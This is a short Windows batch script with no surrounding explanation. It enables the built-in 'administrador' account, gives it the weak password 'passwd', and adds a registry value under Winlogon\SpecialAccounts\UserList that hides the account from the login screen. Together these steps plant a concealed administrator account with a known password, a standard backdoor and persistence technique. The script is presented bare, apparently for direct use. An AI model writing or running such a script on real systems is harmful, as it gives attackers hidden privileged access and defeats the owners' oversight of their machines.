net user administrador /active:yes
pause
net user administrador passwd
pause 
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v administrador /d 0 /t REG_DWORD
pause
